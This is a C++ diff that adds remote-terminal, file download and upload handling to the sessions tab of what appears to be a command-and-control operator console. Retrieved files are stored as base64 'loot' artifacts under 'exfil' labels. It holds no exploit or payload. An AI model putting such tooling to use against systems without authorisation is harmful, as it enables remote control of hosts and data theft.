@@ -1,5 +1,169 @@
 #include "UiShared.hpp"
+#include "FileBrowser.hpp"
+#include "ResultManager.hpp"
 #include "SessionManager.hpp"
+#include "LootArchive.hpp"
+#include "ExfilEnvelope.hpp"
+#include "Types.hpp"
+#include <SessionTransfer.hpp>
+
+#include <cstring>
+#include <filesystem>
+#include <fstream>
+#include <format>
+#include <string>
+#include <string_view>
+
+namespace {
+
+std::string trim_copy(std::string value) {
+    const auto start = value.find_first_not_of(" \t\n\r");
+    if (start == std::string::npos) {
+        return "";
+    }
+
+    const auto end = value.find_last_not_of(" \t\n\r");
+    return value.substr(start, end - start + 1);
+}
+
+std::optional<std::string> parse_single_arg_command(std::string_view command, std::string_view verb) {
+    if (!command.starts_with(verb)) {
+        return std::nullopt;
+    }
+
+    if (command.size() <= verb.size()) {
+        return std::nullopt;
+    }
+
+    if (command[verb.size()] != ' ') {
+        return std::nullopt;
+    }
+
+    const auto arg = trim_copy(std::string(command.substr(verb.size() + 1)));
+    if (!session_transfer::is_valid_filename(arg)) {
+        return std::nullopt;
+    }
+
+    return arg;
+}
+
+void run_terminal_command(
+    const char* command,
+    std::string& output,
+    const SessionDAO& session,
+    SessionManager& sessionMan,
+    FileBrowser& download_browser,
+    FileBrowser& upload_browser,
+    std::string& pending_download_data,
+    std::string& pending_download_name,
+    std::string& pending_upload_name) {
+    if (strnlen(command, 5) < 2) {
+        return;
+    }
+
+    if (sessionMan.getBridgeState(session) != SessionBridgeState::Ready) {
+        output += std::format("\n> {}\n<Session not ready>\n", command);
+        return;
+    }
+
+    const std::string_view cmd_view{command};
+
+    if (cmd_view == "mlvx_help") {
+        output += std::format(
+            "> {}\nAvailable commands:\n"
+            "  mlvx_help              - Show this help message\n"
+            "  clear / cls            - Clear terminal output\n"
+            "  download <filename>    - Download a file from the remote working directory\n"
+            "  upload <filename>      - Upload a local file to the remote working directory\n",
+            command);
+        return;
+    }
+
+    if (cmd_view == "clear" || cmd_view == "cls") {
+        output.clear();
+        return;
+    }
+
+    if (const auto filename = parse_single_arg_command(cmd_view, "download")) {
+        output += std::format("\n> {}\n", command);
+        const auto result = sessionMan.downloadFile(session, *filename);
+        if (!result.success) {
+            output += std::format("{}\n", result.message);
+            return;
+        }
+
+        pending_download_data = std::move(result.data);
+        pending_download_name = *filename;
+        download_browser.set_title("Save Downloaded File");
+        download_browser.set_suggested_filename(*filename);
+        download_browser.clear();
+        download_browser.open();
+        output += "Select where to save the downloaded file...\n";
+        return;
+    }
+
+    if (const auto filename = parse_single_arg_command(cmd_view, "upload")) {
+        output += std::format("\n> {}\n", command);
+        pending_upload_name = *filename;
+        upload_browser.set_title("Select File To Upload");
+        upload_browser.clear();
+        upload_browser.open();
+        output += "Select a local file to upload...\n";
+        return;
+    }
+
+    sessionMan.discardPendingOutput(session);
+    output += std::format("\n> {}\n{}", command, sessionMan.execute(session, command));
+}
+
+bool write_download_to_path(
+    const std::string& path,
+    const std::string& data,
+    const std::string& remote_filename,
+    std::string& output) {
+    std::error_code ec;
+    const auto parent = std::filesystem::path(path).parent_path();
+    if (!parent.empty()) {
+        std::filesystem::create_directories(parent, ec);
+    }
+
+    std::ofstream out(path, std::ios::binary | std::ios::trunc);
+    if (!out) {
+        output += std::format("Failed to write downloaded file to [{}]\n", path);
+        return false;
+    }
+
+    out.write(data.data(), static_cast<std::streamsize>(data.size()));
+    output += std::format("Downloaded {} bytes to [{}]\n", data.size(), path);
+
+    ResultDAO local;
+    local.uid = generate_uuid();
+    local.command_uid = generate_uuid();
+    local.kind = std::string(exfil::kKindFile);
+    local.status = exfil::kStatusSuccess;
+    local.created_at = get_unix_time();
+    std::vector<unsigned char> bytes(data.begin(), data.end());
+    local.data = loot_archive::encode_base64(bytes);
+    ResultManager::instance().add_local_artifact(
+        local,
+        std::format("download {}", remote_filename),
+        "session");
+
+    return true;
+}
+
+std::optional<std::string> read_local_file(const std::string& path) {
+    std::ifstream input(path, std::ios::binary);
+    if (!input) {
+        return std::nullopt;
+    }
+
+    return std::string{
+        std::istreambuf_iterator<char>(input),
+        std::istreambuf_iterator<char>()};
+}
+
+} // namespace
 
 void drawSessionsTab(WindowState& state) {
     static int selected_session = -1;
@@ -10,6 +174,13 @@ void drawSessionsTab(WindowState& state) {
     static SessionBridgeState last_reported_state = SessionBridgeState::Closed;
     static size_t last_session_count = 0;
     static SessionManager& sessionMan = SessionManager::instance();
+    static FileBrowser download_browser{FileBrowser::Mode::SAVE_FILE};
+    static FileBrowser upload_browser{FileBrowser::Mode::OPEN_FILE};
+    static std::string pending_download_data;
+    static std::string pending_download_name;
+    static std::string pending_upload_name;
+    static bool download_browser_was_open = false;
+    static bool upload_browser_was_open = false;
     const Color panel_fill{36, 36, 46, 255};
     const Color panel_border{90, 90, 110, 255};
 
@@ -236,7 +407,16 @@ void drawSessionsTab(WindowState& state) {
     if (GuiButton({command_bar.x + command_bar.width - button_width * 2.0f - ui::kGap, command_bar.y, button_width, ui::kControlHeight}, "Run") ||
         GuiTextBox(commandRect, commandInput, 1024, commandEditMode && session_ready)) {
         if (session_ready && strlen(commandInput) > 0) {
-            run_terminal_command(commandInput, terminalOutput, session);
+            run_terminal_command(
+                commandInput,
+                terminalOutput,
+                session,
+                sessionMan,
+                download_browser,
+                upload_browser,
+                pending_download_data,
+                pending_download_name,
+                pending_upload_name);
             commandInput[0] = '\0';
 
             Vector2 newTextSize = MeasureTextEx(state.font, terminalOutput.c_str(), 16.0f, 1.0f);
@@ -256,4 +436,47 @@ void drawSessionsTab(WindowState& state) {
     if (!session_ready) {
         GuiEnable();
     }
+
+    download_browser.render();
+    if (download_browser_was_open && !download_browser.is_open()) {
+        const auto save_path = download_browser.get_selected_path();
+        if (!save_path.empty() && !pending_download_data.empty()) {
+            write_download_to_path(save_path, pending_download_data, pending_download_name, terminalOutput);
+        } else if (!pending_download_data.empty()) {
+            terminalOutput += "Download cancelled.\n";
+        }
+        download_browser.clear();
+        pending_download_data.clear();
+        pending_download_name.clear();
+    }
+    download_browser_was_open = download_browser.is_open();
+
+    upload_browser.render();
+    if (upload_browser_was_open && !upload_browser.is_open()) {
+        const auto local_path = upload_browser.get_selected_path();
+        if (!local_path.empty() && !pending_upload_name.empty()) {
+            const auto file_data = read_local_file(local_path);
+            if (!file_data.has_value()) {
+                terminalOutput += std::format("Failed to read local file [{}]\n", local_path);
+            } else if (file_data->size() > session_transfer::kMaxTransferBytes) {
+                terminalOutput += "Selected file exceeds the maximum transfer size.\n";
+            } else {
+                const auto result = sessionMan.uploadFile(session, pending_upload_name, *file_data);
+                if (result.success) {
+                    terminalOutput += std::format(
+                        "Uploaded [{}] ({} bytes) to remote file [{}]\n",
+                        local_path,
+                        file_data->size(),
+                        pending_upload_name);
+                } else {
+                    terminalOutput += std::format("{}\n", result.message);
+                }
+            }
+        } else if (!pending_upload_name.empty()) {
+            terminalOutput += "Upload cancelled.\n";
+        }
+        upload_browser.clear();
+        pending_upload_name.clear();
+    }
+    upload_browser_was_open = upload_browser.is_open();
 }
